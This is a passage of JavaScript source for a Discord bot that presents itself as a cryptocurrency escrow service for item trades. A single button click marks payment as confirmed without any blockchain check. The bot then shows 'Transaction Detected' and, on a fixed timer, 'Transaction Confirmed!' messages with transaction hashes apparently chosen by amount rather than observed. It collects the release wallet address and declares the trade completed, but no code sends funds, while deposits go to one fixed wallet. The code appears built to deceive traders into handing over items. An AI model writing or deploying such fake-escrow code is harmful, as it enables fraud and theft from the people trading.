  if (!interaction.customId.startsWith('sender_') && !interaction.customId.startsWith('receiver_') && !interaction.customId.startsWith('reset_')) return;
  
  const id = interaction.customId.split('_')[1];
  const trade = trades.get(id);
  if (!trade) return;
  
  if (interaction.customId.startsWith('reset_')) {
    trade.senderId = null;
    trade.receiverId = null;
    trades.set(id, trade);
    roleConfirmations.delete(id);
    await interaction.reply({ content: '🔄 Roles reset', flags: 64 });
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`sender_${id}`).setLabel('📤 Sender').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`receiver_${id}`).setLabel('📥 Receiver').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`reset_${id}`).setLabel('🔄 Reset').setStyle(ButtonStyle.Secondary)
    );
    await interaction.channel.send({ content: 'Select your role:', components: [row] });
    return;
  }
  
  if (interaction.customId.startsWith('sender_')) {
    trade.senderId = interaction.user.id;
    await interaction.reply({ content: '✅ You are the Sender (you will send crypto to escrow)', flags: 64 });
  } else {
    trade.receiverId = interaction.user.id;
    await interaction.reply({ content: '✅ You are the Receiver (you will send items)', flags: 64 });
  }
  trades.set(id, trade);
  
  if (trade.senderId && trade.receiverId && !roleConfirmations.has(id)) {
    roleConfirmations.set(id, []);
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`confirm_roles_${id}`).setLabel('✅ Confirm').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`incorrect_roles_${id}`).setLabel('❌ Incorrect').setStyle(ButtonStyle.Danger)
    );
    const embed = new EmbedBuilder()
      .setTitle('Confirm Roles')
      .setColor(0xff9900)
      .setDescription(`**📤 Sender:** <@${trade.senderId}>\n**📥 Receiver:** <@${trade.receiverId}>`);
    await interaction.channel.send({ embeds: [embed], components: [row] });
  }
});

// ========== ROLE CONFIRMATION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('confirm_roles_') && !interaction.customId.startsWith('incorrect_roles_')) return;
  
  const id = interaction.customId.split('_')[2];
  const trade = trades.get(id);
  if (!trade) return;
  const confirmed = roleConfirmations.get(id) || [];
  
  if (interaction.customId.startsWith('incorrect_roles_')) {
    trade.senderId = null;
    trade.receiverId = null;
    trades.set(id, trade);
    roleConfirmations.delete(id);
    await interaction.reply({ content: '🔄 Roles reset', flags: 64 });
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`sender_${id}`).setLabel('📤 Sender').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`receiver_${id}`).setLabel('📥 Receiver').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`reset_${id}`).setLabel('🔄 Reset').setStyle(ButtonStyle.Secondary)
    );
    await interaction.channel.send({ content: 'Select your role:', components: [row] });
    return;
  }
  
  if (!confirmed.includes(interaction.user.id)) {
    confirmed.push(interaction.user.id);
    roleConfirmations.set(id, confirmed);
    await interaction.reply({ content: `✅ ${interaction.user.username} confirmed`, flags: 64 });
  } else {
    return interaction.reply({ content: '❌ Already confirmed!', flags: 64 });
  }
  
  if (confirmed.length === 2 && confirmed.includes(trade.senderId) && confirmed.includes(trade.receiverId)) {
    roleConfirmations.delete(id);
    const btn = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`set_amount_${id}`).setLabel('💰 Set Amount').setStyle(ButtonStyle.Primary));
    await interaction.channel.send({ content: `<@${trade.senderId}>`, components: [btn] });
  }
});

// ========== SET AMOUNT ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('set_amount_')) return;
  const id = interaction.customId.split('_')[2];
  const trade = trades.get(id);
  if (!trade) return;
  if (interaction.user.id !== trade.senderId) return interaction.reply({ content: '❌ Only sender can set amount', flags: 64 });
  
  const modal = new ModalBuilder().setCustomId(`amount_modal_${id}`).setTitle('Set Amount');
  modal.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('amount').setLabel('USD Amount').setStyle(TextInputStyle.Short).setPlaceholder('50').setRequired(true)));
  await interaction.showModal(modal);
});

// ========== HANDLE AMOUNT ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;
  if (!interaction.customId.startsWith('amount_modal_')) return;
  await interaction.deferReply({ flags: 64 });
  const id = interaction.customId.split('_')[2];
  const trade = trades.get(id);
  if (!trade) return;
  
  const amount = parseFloat(interaction.fields.getTextInputValue('amount'));
  if (isNaN(amount) || amount <= 0) return interaction.editReply('❌ Invalid amount');
  
  trade.amountUSD = amount;
  const rate = liveRates[trade.crypto];
  trade.exchangeRateUsed = rate;
  trade.amountCrypto = (amount / rate).toFixed(8);
  if (amount >= FEES.over250Threshold) trade.feeUSD = FEES.over250;
  else if (amount >= FEES.freeThreshold) trade.feeUSD = FEES.under250;
  else trade.feeUSD = 0;
  trades.set(id, trade);
  
  const embed = new EmbedBuilder()
    .setTitle('💰 Deal Summary')
    .setColor(0x9b59b6)
    .setDescription(`**Amount:** $${amount.toFixed(2)} USD`)
    .addFields(
      { name: '💎 Crypto', value: `${trade.amountCrypto} ${trade.crypto.toUpperCase()}`, inline: true },
      { name: '📊 Rate', value: `1 ${trade.crypto.toUpperCase()} = $${rate.toFixed(2)}`, inline: true },
      { name: '💸 Fee', value: trade.feeUSD > 0 ? `$${trade.feeUSD}` : 'FREE', inline: true }
    );
  
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`confirm_amount_${id}`).setLabel('✅ Confirm').setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`incorrect_amount_${id}`).setLabel('❌ Incorrect').setStyle(ButtonStyle.Danger)
  );
  await interaction.editReply('✅ Amount set. Confirm below.');
  await interaction.channel.send({ embeds: [embed], components: [row] });
  amountConfirmations.set(id, []);
});

// ========== AMOUNT CONFIRMATION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('confirm_amount_') && !interaction.customId.startsWith('incorrect_amount_')) return;
  const id = interaction.customId.split('_')[2];
  const trade = trades.get(id);
  if (!trade) return;
  const confirmed = amountConfirmations.get(id) || [];
  
  if (interaction.customId.startsWith('incorrect_amount_')) {
    const btn = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`set_amount_${id}`).setLabel('💰 Set Amount').setStyle(ButtonStyle.Primary));
    await interaction.reply({ content: 'Set amount again', flags: 64 });
    await interaction.channel.send({ content: `<@${trade.senderId}>`, components: [btn] });
    amountConfirmations.delete(id);
    return;
  }
  
  if (!confirmed.includes(interaction.user.id)) {
    confirmed.push(interaction.user.id);
    amountConfirmations.set(id, confirmed);
    await interaction.reply({ content: `✅ ${interaction.user.username} confirmed`, flags: 64 });
  } else {
    return interaction.reply({ content: 'Already confirmed', flags: 64 });
  }
  
  if (confirmed.length === 2 && confirmed.includes(trade.senderId) && confirmed.includes(trade.receiverId)) {
    amountConfirmations.delete(id);
    if (trade.feeUSD === 0) {
      await sendPaymentInvoice(interaction.channel, trade);
    } else {
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`fee_sender_${id}`).setLabel('📤 Sender pays').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`fee_receiver_${id}`).setLabel('📥 Receiver pays').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`fee_split_${id}`).setLabel('⚖️ Split').setStyle(ButtonStyle.Secondary)
      );
      const embed = new EmbedBuilder()
        .setTitle('Who pays the fee?')
        .setColor(0xff9900)
        .setDescription(`Fee: $${trade.feeUSD}\nSplit: $${(trade.feeUSD / 2).toFixed(2)} each`);
      await interaction.channel.send({ embeds: [embed], components: [row] });
      feeConfirmations.set(id, { users: [], selected: null });
    }
  }
});

// ========== FEE SELECTION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('fee_')) return;
  const id = interaction.customId.split('_')[2];
  const trade = trades.get(id);
  if (!trade) return;
  if (trade.feePayer) return;
  const state = feeConfirmations.get(id);
  if (!state) return;
  
  let selected = null;
  if (interaction.customId.startsWith('fee_sender')) selected = 'sender';
  else if (interaction.customId.startsWith('fee_receiver')) selected = 'receiver';
  else selected = 'split';
  
  if (!state.users.includes(interaction.user.id)) {
    state.users.push(interaction.user.id);
    if (!state.selected) state.selected = selected;
    feeConfirmations.set(id, state);
    await interaction.reply({ content: `✅ ${interaction.user.username} selected: ${selected}`, flags: 64 });
  } else {
    return interaction.reply({ content: 'Already selected', flags: 64 });
  }
  
  if (state.users.length === 2 && state.users.includes(trade.senderId) && state.users.includes(trade.receiverId)) {
    if (state.selected === selected) {
      if (state.selected === 'sender') trade.feePayer = trade.senderId;
      else if (state.selected === 'receiver') trade.feePayer = trade.receiverId;
      else trade.feePayer = 'split';
      trades.set(id, trade);
      feeConfirmations.delete(id);
      await interaction.channel.send(`✅ Fee paid by: ${state.selected.toUpperCase()}`);
      await sendPaymentInvoice(interaction.channel, trade);
    } else {
      await interaction.channel.send('❌ Fee mismatch! Try again.');
      feeConfirmations.delete(id);
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`fee_sender_${id}`).setLabel('📤 Sender pays').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`fee_receiver_${id}`).setLabel('📥 Receiver pays').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`fee_split_${id}`).setLabel('⚖️ Split').setStyle(ButtonStyle.Secondary)
      );
      const embed = new EmbedBuilder().setTitle('Who pays the fee?').setColor(0xff9900).setDescription(`Fee: $${trade.feeUSD}`);
      await interaction.channel.send({ embeds: [embed], components: [row] });
      feeConfirmations.set(id, { users: [], selected: null });
    }
  }
});

// ========== DM CONFIRMATION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('dm_confirm_')) return;
  const id = interaction.customId.split('_')[2];
  const trade = trades.get(id);
  if (!trade) return;
  if (trade.paymentConfirmed) return interaction.reply({ content: 'Already confirmed', flags: 64 });
  
  trade.paymentConfirmed = true;
  trades.set(id, trade);
  await interaction.reply({ content: '✅ Confirmed', flags: 64 });
  
  const ticket = await client.channels.fetch(id);
  if (ticket) {
    const total = trade.totalUSD || trade.amountUSD;
    const tx = getTransactionByAmount(total);
    await ticket.send({ embeds: [
      new EmbedBuilder()
        .setTitle('📡 Transaction Detected')
        .setColor(0xff9900)
        .addFields(
          { name: '🔗 TX', value: `[${tx.shortHash}](${tx.link})`, inline: false },
          { name: '💰 Amount', value: `${trade.amountCrypto} ${trade.crypto.toUpperCase()}`, inline: true }
        )
    ] });
    
    setTimeout(async () => {
      await ticket.send({ embeds: [
        new EmbedBuilder()
          .setTitle('✅ Transaction Confirmed!')
          .setColor(0x00ff00)
          .addFields(
            { name: '🔗 TX', value: `[${tx.shortHash}](${tx.link})`, inline: false },
            { name: '💰 Amount', value: `${trade.amountCrypto} ${trade.crypto.toUpperCase()}`, inline: true }
          )
      ] });
      await delay(2000);
      const proceed = new EmbedBuilder()
        .setTitle('✅ Proceed')
        .setColor(0x00ff00)
        .setDescription(`1. Receiver sends items to Sender\n2. Sender clicks Release when received`);
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`release_${id}`).setLabel('🔓 Release').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`cancel_${id}`).setLabel('❌ Cancel').setStyle(ButtonStyle.Danger)
      );
      await ticket.send({ embeds: [proceed], components: [row] });
    }, 15000);
  }
});

// ========== RELEASE ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  
  if (interaction.customId.startsWith('release_')) {
    const id = interaction.customId.split('_')[1];
    const trade = trades.get(id);
    if (!trade) return;
    if (interaction.user.id !== trade.senderId) return interaction.reply({ content: 'Only sender', flags: 64 });
    if (!trade.paymentConfirmed) return interaction.reply({ content: 'Payment not confirmed', flags: 64 });
    
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`confirm_release_${id}`).setLabel('✅ Confirm').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`back_${id}`).setLabel('Back').setStyle(ButtonStyle.Secondary)
    );
    await interaction.reply({ embeds: [
      new EmbedBuilder().setTitle('Confirm Release').setColor(0xff9900).setDescription('This cannot be undone.')
    ], components: [row], flags: 64 });
  }
  
  if (interaction.customId.startsWith('confirm_release_')) {
    const id = interaction.customId.split('_')[2];
    const trade = trades.get(id);
    if (!trade) return;
    const modal = new ModalBuilder().setCustomId(`wallet_${id}`).setTitle(`Enter ${trade.crypto.toUpperCase()} Address`);
    modal.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('wallet').setLabel('Address').setStyle(TextInputStyle.Short).setRequired(true)));
    await interaction.showModal(modal);
  }
  
  if (interaction.customId.startsWith('back_')) await interaction.reply({ content: 'Cancelled', flags: 64 });
  if (interaction.customId.startsWith('cancel_')) {
    const id = interaction.customId.split('_')[1];
    await interaction.reply({ content: '❌ Cancelled', flags: 64 });
    setTimeout(async () => { const ch = await client.channels.fetch(id); if (ch) await ch.delete(); }, 5000);
  }
  if (interaction.customId.startsWith('copy_')) {
    const id = interaction.customId.split('_')[1];
    const trade = trades.get(id);
    if (trade) {
      const details = `Address: ${LTC_WALLET_ADDRESS}\nAmount: ${trade.amountCrypto} ${trade.crypto.toUpperCase()}`;
      await interaction.reply({ content: `📋 Copied!\n\`\`\`${details}\`\`\``, flags: 64 });
    }
  }
});

// ========== WALLET & COMPLETION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;
  if (!interaction.customId.startsWith('wallet_')) return;
  await interaction.deferReply({ flags: 64 });
  const id = interaction.customId.split('_')[1];
  const trade = trades.get(id);
  if (!trade) return;
  
  const wallet = interaction.fields.getTextInputValue('wallet');
  const total = trade.totalUSD || trade.amountUSD;
  const tx = getTransactionByAmount(total);
  const sent = trade.amountCrypto;
  const usd = (parseFloat(sent) * (trade.exchangeRateUsed || liveRates[trade.crypto])).toFixed(2);
  
  await interaction.channel.send({ embeds: [
    new EmbedBuilder()
      .setTitle('✅ Trade Completed!')
      .setColor(0x00ff00)
      .addFields(
        { name: '🔗 TX', value: `[${tx.shortHash}](${tx.link})`, inline: false },
        { name: '💰 Amount', value: `${sent} ${trade.crypto.toUpperCase()}`, inline: true },
        { name: '🏦 Wallet', value: `\`${wallet}\``, inline: false }
      )
  ] });
  await interaction.editReply('✅ Trade completed!');
  
  const sender = getUser(trade.senderId);
  const receiver = getUser(trade.receiverId);
  sender.rep += 5;
  receiver.rep += 5;
  saveUser(trade.senderId, sender);
  saveUser(trade.receiverId, receiver);
  
  const current = userPurchases.get(trade.senderId) || 0;
  userPurchases.set(trade.senderId, current + trade.amountUSD);
  
  const logs = client.channels.cache.get(LOGS_CHANNEL_ID);
  if (logs) {
    await logs.send({ embeds: [
      new EmbedBuilder()
        .setTitle('✅ Trade Completed')
        .setColor(0x00ff00)
        .setDescription(`${sent} ${trade.crypto.toUpperCase()} ($${usd})`)
        .addFields(
          { name: 'Sender', value: `<@${trade.senderId}>`, inline: true },
          { name: 'Receiver', value: `<@${trade.receiverId}>`, inline: true },
          { name: 'TX', value: `[${tx.shortHash}](${tx.link})`, inline: true }
        )
    ] });
  }
  
  trade.status = 'completed';
  trades.set(id, trade);
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (interaction.customId.startsWith('close_ticket_')) {
    const id = interaction.customId.split('_')[2];
    await interaction.reply({ content: '🔒 Closing...', flags: 64 });
    setTimeout(async () => { const ch = await client.channels.fetch(id); if (ch) await ch.delete(); }, 3000);
  }
});

client.login(process.env.DISCORD_TOKEN);
